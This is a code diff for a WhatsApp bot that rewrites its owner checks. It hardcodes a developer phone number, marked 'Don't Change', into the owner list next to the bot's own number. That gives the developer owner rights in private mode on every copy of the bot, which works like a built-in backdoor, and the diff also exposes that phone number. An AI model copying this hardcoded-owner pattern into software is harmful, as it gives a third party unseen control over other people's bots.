@@ -29,9 +29,8 @@ const {
 
 const { commands, replyHandlers } = require('./command');
 
-// ===== OWNER SYSTEM =====
-const ownerNumber = ['94726880784'];
-const MASTER_SUDO = ['94726880784'];
+// ===== DEVELOPER NUMBERS (Don't Change) =====
+const DEV_NUMBERS = ['94726880784']; 
 
 // ===== GLOBAL ERROR HANDLERS =====
 process.on('uncaughtException', (err) => {
@@ -187,17 +186,21 @@ async function connectToWA() {
       const senderNumber = sender.split('@')[0];
       const isGroup = from.endsWith('@g.us');
 
+      // 🔥 FIX: OWNER LOGIC
       const botNumber = ranuxPro.user.id.split(':')[0];
+      
+      // දැන් Bot Number එකත් Owner ලිස්ට් එකට එකතු වෙනවා
+      const ownerNumber = [...DEV_NUMBERS, botNumber]; 
+
       const pushname = mek.pushName || 'No Name';
       const isMe = botNumber.includes(senderNumber);
       const isOwner = ownerNumber.includes(senderNumber) || isMe;
-      const isSudo = MASTER_SUDO.includes(senderNumber);
 
       // Mode Check (Uses Updated Config from DB)
       const mode = (config.MODE || "public").toLowerCase();
       if (mode === "group" && !isGroup) return;
       if (mode === "inbox" && isGroup) return;
-      if (mode === "private" && !(isOwner || isSudo)) return;
+      if (mode === "private" && !isOwner) return;
 
       const m = sms(ranuxPro, mek);
       const type = getContentType(mek.message);
